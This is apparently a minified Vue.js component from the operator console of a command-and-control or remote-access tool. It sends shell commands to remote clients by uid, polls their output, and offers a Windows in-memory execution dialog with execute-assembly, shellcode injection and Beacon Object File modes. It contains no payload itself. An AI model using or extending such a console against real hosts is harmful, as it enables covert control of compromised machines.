import{_ as he}from"./f5f6aa45.js";/* empty css        *//* empty css        *//* empty css        *//* empty css        */import"./4ed993c7.js";/* empty css        */import{ax as fe,aB as me,r as u,e as ge,d as ye,Z as be,l as d,m as _,p as e,V as t,P as l,U as h,a9 as D,n as L,u as i,T as B,a3 as T,F as W,a8 as $,J as q,S as z,az as Ce,aA as we,O as R,R as xe}from"./95bbca75.js";import{C as N}from"./59206fab.js";import{a as V,b as Ie,d as ke,N as Ee,y as Se,w as Be,ai as Ve,v as Me,a2 as Te,x as ze,$ as J,a9 as H,q as X,A as F,aj as Fe,C as De,X as Re,ak as Ne,l as Z,H as He,aa as Oe,al as Ke}from"./3325456c.js";const Ue=fe("commandHistory",{state:()=>({histories:{},currentIndices:{}}),actions:{addCommand(s,f){f.trim()&&(!this.histories[s]||this.histories[s][this.histories[s].length-1]!==f)&&(this.histories[s]||(this.histories[s]=[]),this.histories[s].push(f),this.currentIndices[s]=-1)},getPrevCommand(s){if(!(!this.histories[s]||this.histories[s].length===0)&&(this.currentIndices[s]===-1&&(this.currentIndices[s]=this.histories[s].length),this.currentIndices[s]>0))return this.currentIndices[s]--,this.histories[s][this.currentIndices[s]]},getNextCommand(s){if(!(!this.histories[s]||this.histories[s].length===0))return this.currentIndices[s]>=0&&this.currentIndices[s]<this.histories[s].length-1?(this.currentIndices[s]++,this.histories[s][this.currentIndices[s]]):(this.currentIndices[s]=-1,"")},clearCurrentIndex(s){this.currentIndices[s]=-1},clearHistory(s){this.histories[s]&&(delete this.histories[s],delete this.currentIndices[s])}}});const v=s=>(Ce("data-v-02b065db"),s=s(),we(),s),je={class:"enhanced-terminal-container"},Pe={class:"main-terminal-area"},Ae={class:"terminal-output-container"},Ge={class:"output-header"},Le={class:"output-title"},We=v(()=>e("span",null,"命令输出",-1)),$e={key:0,class:"command-history"},qe={class:"terminal-output"},Je={key:1,class:"empty-output"},Xe={class:"command-input-container"},Ze={class:"input-wrapper"},Qe=v(()=>e("div",{class:"input-hints"},[e("span",{class:"hint-text"},"快捷键: ↑ 上一条命令 | ↓ 下一条命令 | Enter 执行命令")],-1)),Ye={class:"action-buttons"},et={class:"dialog-title"},tt=v(()=>e("span",null,"Windows 内存执行",-1)),st={class:"dialog-content"},lt={class:"dialog-section"},ot={class:"section-label"},at=v(()=>e("span",null,"执行模式",-1)),nt={class:"mode-option-item"},it={class:"option-details"},ct={class:"option-label"},dt={class:"option-desc"},rt={class:"dialog-section"},ut={class:"section-label"},_t=v(()=>e("span",null,"执行文件",-1)),vt=["onDrop"],pt={key:0,class:"upload-placeholder"},ht=v(()=>e("div",{class:"upload-text"},[e("p",{class:"upload-title"},"点击选择或拖拽文件到此处"),e("p",{class:"upload-subtitle"},"支持 .exe, .dll, .bin, .raw, .cna 等格式")],-1)),ft={key:1,class:"file-selected"},mt={class:"file-details"},gt={class:"file-name"},yt={class:"file-info"},bt={class:"dialog-section"},Ct={class:"section-label"},wt=v(()=>e("span",null,"运行参数 (可选)",-1)),xt={key:0,class:"dialog-section"},It={class:"section-label"},kt=v(()=>e("span",null,"执行预览",-1)),Et={class:"preview-card"},St={key:0,class:"preview-item"},Bt={class:"preview-content"},Vt=v(()=>e("div",{class:"preview-label"},"文件",-1)),Mt={class:"preview-value"},Tt={key:1,class:"preview-item"},zt={class:"preview-content"},Ft=v(()=>e("div",{class:"preview-label"},"模式",-1)),Dt={class:"preview-value"},Rt={key:2,class:"preview-item"},Nt={class:"preview-content"},Ht=v(()=>e("div",{class:"preview-label"},"参数",-1)),Ot={class:"preview-value"},Kt={class:"dialog-footer"},Ut={__name:"ClientShell",setup(s){const f=Ue(),Q=me(),m=u(""),I=u(""),k=u(""),Y=u(""),p=u(!1),y=String(Q.query.uid),b=u(null),ee=u(null),E=u(!1),C=u(null),c=u(null),g=u(""),w=u("execute-assembly"),O=ge(()=>[{title:".NET 程序执行",options:[{value:"execute-assembly",label:"Execute Assembly",description:"执行 .NET 程序集内存加载",icon:"MagicStick",iconClass:"net-icon"}]},{title:"原生程序执行",options:[{value:"inline-bin",label:"Inline Binary",description:"执行原生二进制程序内存加载",icon:"Cpu",iconClass:"native-icon"}]},{title:"Shellcode注入",options:[{value:"shellcode-inject",label:"Shellcode Inject",description:"注入并执行 Shellcode",icon:"Connection",iconClass:"inject-icon"}]},{title:"BOF 执行",options:[{value:"inline-execute",label:"Inline Execute",description:"执行 BOF (Beacon Object File)",icon:"Tools",iconClass:"bof-icon"}]}]),K=async()=>{if(m.value.trim()==="")return;const o=m.value.trim();Y.value=o,m.value="",f.addCommand(y,o),f.clearCurrentIndex(y),p.value=!0;try{const a=await N.send_commands({uid:y,command:o});k.value=a.data.data,I.value!==k.value&&(I.value=k.value,await L(),b.value&&(b.value.scrollTop=b.value.scrollHeight))}catch{V.error("命令执行失败")}finally{p.value=!1}},te=()=>{const o=f.getPrevCommand(y);o!==void 0&&(m.value=o)},se=()=>{const o=f.getNextCommand(y);o!==void 0&&(m.value=o)};function U(){N.get_shellcontent({uid:y}).then(o=>{k.value=o.data.data,I.value!==k.value&&(I.value=k.value,L(()=>{b.value&&(b.value.scrollTop=b.value.scrollHeight)}))})}const le=o=>{for(const a of O.value){const n=a.options.find(S=>S.value===o);if(n)return n.label}return o},oe=()=>{C.value&&C.value.click()},ae=o=>{const a=o.target.files;a&&a.length>0&&(c.value=a[0])},ne=o=>{const a=o.dataTransfer.files;a&&a.length>0&&(c.value=a[0])},ie=()=>{c.value=null,C.value&&(C.value.value="")},ce=o=>{if(o===0)return"0 Bytes";const a=1024,n=["Bytes","KB","MB","GB"],S=Math.floor(Math.log(o)/Math.log(a));return parseFloat((o/Math.pow(a,S)).toFixed(2))+" "+n[S]},de=async()=>{if(!c.value){V.warning("请先选择一个文件！");return}p.value=!0;try{const o=g.value.trim(),a=w.value,n=await N.ExecuteBin({uid:y,mode:a,file:c.value,args:o});n.data.status===200?(V.success("后台执行成功"),E.value=!1,P()):V.error(n.data.data)}catch(o){console.error("执行过程中出错:",o),V.error(`执行失败: ${o.message||"未知错误"}`)}finally{p.value=!1}},j=()=>{if(p.value){V.warning("请等待当前执行完成");return}c.value||g.value?Ie.confirm("关闭将清除已选择的文件和输入的参数，确定要关闭吗？","提示",{confirmButtonText:"确定",cancelButtonText:"取消",type:"warning"}).then(()=>{E.value=!1,P()}):E.value=!1},P=()=>{c.value=null,g.value="",w.value="execute-assembly",C.value&&(C.value.value="")};return ye(()=>{U();const o=setInterval(U,2e3);be(()=>{clearInterval(o)})}),(o,a)=>{const n=ke,S=Ve,M=Me,A=Ee,re=Se,ue=Oe,_e=Ke,ve=Te,G=ze,pe=Be;return d(),_("div",je,[e("div",Pe,[e("div",Ae,[e("div",Ge,[e("div",Le,[t(n,null,{default:l(()=>[t(i(J))]),_:1}),We])]),e("div",{class:"output-content",ref_key:"outputRef",ref:b},[I.value?(d(),_("div",$e,[e("pre",qe,h(I.value),1)])):(d(),_("div",Je,[t(S,{description:"暂无输出，请输入命令开始操作"})]))],512)]),e("div",Xe,[e("div",Ze,[t(A,{modelValue:m.value,"onUpdate:modelValue":a[0]||(a[0]=r=>m.value=r),class:"enhanced-command-input",placeholder:"输入命令，按 Enter 执行，↑↓ 键切换历史命令，clear清除历史命令",onKeyup:D(K,["enter"]),onKeydown:[D(T(te,["prevent"]),["up"]),D(T(se,["prevent"]),["down"])],ref_key:"inputRef",ref:ee,spellcheck:!1,size:"large"},{prefix:l(()=>[t(n,null,{default:l(()=>[t(i(J))]),_:1})]),append:l(()=>[t(M,{type:"primary",onClick:K,loading:p.value,disabled:!m.value.trim()},{default:l(()=>[B(" 执行 ")]),_:1},8,["loading","disabled"])]),_:1},8,["modelValue","onKeyup","onKeydown"])]),Qe,e("div",Ye,[t(re,{content:"Windows内存执行",placement:"top"},{default:l(()=>[t(M,{type:"primary",onClick:a[1]||(a[1]=r=>E.value=!0),size:"default",class:"action-button"},{default:l(()=>[t(n,null,{default:l(()=>[t(i(H))]),_:1}),B(" Windows内存执行 ")]),_:1})]),_:1})])])]),t(pe,{modelValue:E.value,"onUpdate:modelValue":a[5]||(a[5]=r=>E.value=r),title:"内存执行",width:"520px","before-close":j,class:"enhanced-memory-dialog",center:""},{header:l(()=>[e("div",et,[t(n,{class:"dialog-icon"},{default:l(()=>[t(i(H))]),_:1}),tt])]),footer:l(()=>[e("div",Kt,[t(M,{onClick:j,disabled:p.value},{default:l(()=>[B(" 取消 ")]),_:1},8,["disabled"]),t(M,{type:"primary",onClick:de,disabled:!c.value||p.value,loading:p.value,class:"execute-button"},{default:l(()=>[t(n,null,{default:l(()=>[t(i(H))]),_:1}),B(" 确定执行 ")]),_:1},8,["disabled","loading"])])]),default:l(()=>[e("div",st,[e("div",lt,[e("div",ot,[t(n,null,{default:l(()=>[t(i(X))]),_:1}),at]),t(ve,{modelValue:w.value,"onUpdate:modelValue":a[2]||(a[2]=r=>w.value=r),placeholder:"请选择执行模式",class:"mode-selector",size:"large",filterable:""},{default:l(()=>[(d(!0),_(W,null,$(O.value,r=>(d(),R(_e,{key:r.title,label:r.title},{default:l(()=>[(d(!0),_(W,null,$(r.options,x=>(d(),R(ue,{key:x.value,label:x.label,value:x.value},{default:l(()=>[e("div",nt,[t(n,{class:q(x.iconClass)},{default:l(()=>[(d(),R(xe(x.icon)))]),_:2},1032,["class"]),e("div",it,[e("div",ct,h(x.label),1),e("div",dt,h(x.description),1)])])]),_:2},1032,["label","value"]))),128))]),_:2},1032,["label"]))),128))]),_:1},8,["modelValue"])]),e("div",rt,[e("div",ut,[t(n,null,{default:l(()=>[t(i(F))]),_:1}),_t]),e("div",{class:q(["file-upload-card",{"has-file":c.value}]),onClick:oe,onDragover:a[3]||(a[3]=T(()=>{},["prevent"])),onDrop:T(ne,["prevent"])},[c.value?(d(),_("div",ft,[t(n,{class:"file-icon"},{default:l(()=>[t(i(F))]),_:1}),e("div",mt,[e("div",gt,h(c.value.name),1),e("div",yt,[t(G,{size:"small",type:"info"},{default:l(()=>[t(n,null,{default:l(()=>[t(i(F))]),_:1}),B(" "+h(ce(c.value.size)),1)]),_:1}),t(G,{size:"small",type:"success"},{default:l(()=>[t(n,null,{default:l(()=>[t(i(De))]),_:1}),B(" "+h(new Date(c.value.lastModified).toLocaleDateString()),1)]),_:1})])]),t(M,{type:"danger",size:"small",circle:"",onClick:T(ie,["stop"]),icon:i(Re)},null,8,["onClick","icon"])])):(d(),_("div",pt,[t(n,{class:"upload-icon"},{default:l(()=>[t(i(Fe))]),_:1}),ht])),e("input",{type:"file",ref_key:"fileInputRef",ref:C,onChange:ae,style:{display:"none"}},null,544)],42,vt)]),e("div",bt,[e("div",Ct,[t(n,null,{default:l(()=>[t(i(Ne))]),_:1}),wt]),t(A,{modelValue:g.value,"onUpdate:modelValue":a[4]||(a[4]=r=>g.value=r),placeholder:"请输入程序运行参数，多个参数用空格分隔",type:"textarea",rows:2,clearable:"",class:"params-input",autosize:{minRows:2,maxRows:4}},{prefix:l(()=>[t(n,null,{default:l(()=>[t(i(Z))]),_:1})]),_:1},8,["modelValue"])]),c.value||g.value||w.value?(d(),_("div",xt,[e("div",It,[t(n,null,{default:l(()=>[t(i(He))]),_:1}),kt]),e("div",Et,[c.value?(d(),_("div",St,[t(n,{class:"preview-icon"},{default:l(()=>[t(i(F))]),_:1}),e("div",Bt,[Vt,e("div",Mt,h(c.value.name),1)])])):z("",!0),w.value?(d(),_("div",Tt,[t(n,{class:"preview-icon"},{default:l(()=>[t(i(X))]),_:1}),e("div",zt,[Ft,e("div",Dt,h(le(w.value)),1)])])):z("",!0),g.value?(d(),_("div",Rt,[t(n,{class:"preview-icon"},{default:l(()=>[t(i(Z))]),_:1}),e("div",Nt,[Ht,e("div",Ot,h(g.value||"无"),1)])])):z("",!0)])])):z("",!0)])]),_:1},8,["modelValue"])])}}},Zt=he(Ut,[["__scopeId","data-v-02b065db"]]);export{Zt as default};
